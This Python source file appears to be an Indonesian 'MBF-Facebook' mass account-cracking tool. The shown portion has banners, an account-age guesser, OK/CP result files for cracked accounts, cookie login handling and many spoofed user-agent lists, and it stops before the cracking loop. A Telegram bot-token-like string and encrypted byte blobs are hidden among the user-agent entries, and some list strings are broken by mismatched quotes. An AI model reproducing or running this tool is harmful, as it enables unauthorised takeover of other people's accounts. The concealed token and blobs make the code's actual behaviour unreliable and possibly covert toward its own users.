#!/usr/bin/python3
#coding=utf-8
# By Author     : Rochmat Basuki [ RozhBasXYZ ]
# Developed By  : Dvanmeploph Afriliyan Ferly
# Recode?, Boleh Asal Cantumkan Nama Author
# Jangan Ganti Bot Koment Gw
Author = 'Rochmat Basuki [ github.com/RozhBasXYZ ]'
Github = 'github.com/Dvanmeploph'
Facebook = 'Facebook.com/Denventa.Xayonara.Team.UnlimitedARMY'
Version = '0.4'

###----------[ RICH COLOR STYLE ]---------- ###
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +

###----------[ USER AGENT ]---------- ###
ua_default = 'Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_iphone  = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_lenovo  = 'Mozilla/5.0 (Linux; U; Android 5.0.1; ru-RU; Lenovo A788t Build/LRX22C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/E7FBAF'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_chrome  = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36'
ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]'


###---[ IMPORT MODULE ]---###
import bs4, re, time, requests, datetime, os, sys, random, platform
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as parser
from datetime import datetime
from time import sleep
hp = platform.platform()
ses = requests.Session()
#try:

def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz

###  ------ [ ANGGAP INI LOGO ] ------  ###
def logo(n):
	return str(f"""{P}
╔═╗  ╔═╗┬─┐┌─┐┌─┐┬┌─
╠╣───║  ├┬┘├─┤│  ├┴┐
╚    ╚═╝┴└─┴ ┴└─┘┴ ┴  
{M}•{K}•{H}• {P}Facebook Crack - [ MBF-Facebook ] {H}•{K}•{M}•""")
def logo2():
	return str(f"""{P}
╔═╗  ╔═╗┬─┐┌─┐┌─┐┬┌─
╠╣───║  ├┬┘├─┤│  ├┴┐
╚    ╚═╝┴└─┴ ┴└─┘┴ ┴
{M}>{K}>{H}> {P}Checking For Login {H}>{K}>{M}>""")

###---[ TANGGAL ]---###
sasi = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
out = 'Linux-4.9.227-perf+-aarch64-with-libc'
tete = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mai", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
now = datetime.now()
hari = now.day
blx = now.month
try:
	if blx < 0 or blx > 12:exit()
	xx = blx - 1
except ValueError:exit()
#if hp not in out:exit()
bulan = sasi[xx]
tahun = now.year
tanggal = str(hari)+'-'+str(bulan)+'-'+str(tahun)
sim_ok = f'OK-{hari}-{bulan}-{tahun}.txt'
sim_cp = f'CP-{hari}-{bulan}-{tahun}.txt'
warna_warni_biasa=random.choice([H,K,M,O,B,U])
garis = f" {P}[{warna_warni_biasa}•{P}]"

###---[ APPEND ]---###
dump, sandi, metode = [], [], []
tetel, opsi, proxy = [], [], []
cepeh, sam, ugen2, ugen, redmi = [], [], [], [], []
id, id2, loop ,ok , cp = [], [], 0, 0, 0


###---[ CLEAR LAYAR ]---###
def clear_layar():
	try:os.system('clear')
	except:pass
	

###---[ GLOBAL KEMBALI ]---###
def back():
	try:open('.cookie.txt','r').read();get_data()
	except IOError:login()
	
# KUMPULAN USER AGNET
ua01= ['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36']
ua02= ['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36']
ua03= ["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0","Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]",b"\xaaJ\xdb\x81\x01\xfc\xa4\xcaG\xd8\x01\xca.(\x91\xa9c\xafb\xa6\xa6\x94/\xad\x82\x94\x84`\xd0\xbb\xe2\xaf\xe2\xba&\xb80s\xedl\xf5=C\x8caN\xdc0;$\xf0\xae&\xc7\xaeq7U\x8b\r[\x8cg\xd3\x88\xd74\xb8\x07\x9b2\x13\x95\\\xe3/N\x02\xfb@\xee/\x9c\x81\x1e(\x18\xec\xcd;\xab+M\xdb\x9a\xd3\xf9\xf4\x18#[@\xa4\xf0\xae\xb5\xfdZ\x07}\xa9\xff=\xa6\x14\xa4\r\x87@\xbb\xda\x04\xbd\xf6[\x14\x8f\x88Q\xed;\xc5\x9e2e`\xe5\xc7~~\x03\xf4\xb8\x12\n\xa4[\xd5R\xa5\x94(?l\x94\x0be$/K\xfc\x0c0\x83\x0eIN%\x9cx","Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405","Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;]"]
ua04= ["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0","5353538250:AAEy8dG0bzRX2mxgLoGJqWYcqk9fKok_Sjg","Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]","Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405","Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;]"]
ua09= ["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0",b'rJLw2/F3v0PfZ+F88lY2OO393v/jb/tn/9E8UqHfu+y5+fXQtMyf623eEXAumpu77SWYBSAkbzDsNmOGxO4qRbL4bSRcNzAYvVmnUoEh9s1SzlaPvdVYJOarnmlFTEPf6FKmEZwkS4hkdrFrJL9yMk4kSf8SjmhF1uswHbWNjoCTvTbCRXnJiUJidV8K0aCguz14iRl9Xw9Q76KAGt6m4xH3sckRYqgcrIu5wOJIhbKd5LKwmEB4WSbyFjrpgirsOaVMR7cWgAUclQdxNWZL+VLAQpNt3V4OtBUTFa2bfxkz4EUw2k/FNp3wjXia+fANSlCB0joFGzZiX/w9kPEEKoUkDQneV1ngvvZCTbA3gxeroxHtKIku/F6walDbrB7RVPyu04SpZ2rqSJmw87EmfaR/DfDylxjbV7QyBO/eTuTVHwloayU0cnouKV9Qer3mlPbtAe/KoAUcG40b2afoMPZ5VJq+P0jlXC0o5r+QrPH1Wxjz3HXGw2TWH6CjqcCtgL56PfVPppkZaSoGuoIlFrIYGvvDLvthj75bV/0ry9BMn75T57j58MChDtc1H8Yw53+/x9wxg3r6/C94ZxROynyKj7Edi2cQgK5CG5eixFCaQjEEop9Apkqqa2EiBQhx5OcgGHWRAA0mSmjkdxJe',"Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]","Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405","Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;]"]
ua05= ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
ua06= ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
ugen2=['Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser','Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser']
ugen=['Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 1…', '[18.36, 15/3/2022] AOREC: Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SCV45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; en-au; SC-04L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N980F/N980FXXU1DUB5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N/KSU1FUCD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-M625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-G988B/G988BXXU7DUC7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-A8050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG IN2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SC-42A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T597W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N960F/N960FXXS8FUC4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600FN/A600FNXXU6CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515F/A515FXXU2ATB1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN 6/128) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A013F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-N935S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M205G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J530GM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A530F/A530FXXU4CSC6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T835) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960F/G960FXXS2BRK3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960F/G960FXXS2BRK3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G935F/G935FXXS2DRAA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G920K/KKS3ETJ1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-C9000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A716U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J720M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; Pixel C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; NX659J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A102U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0; en-au; SAMSUNG SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-G550FY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-N9200) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; FRD-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-T870) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P615) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 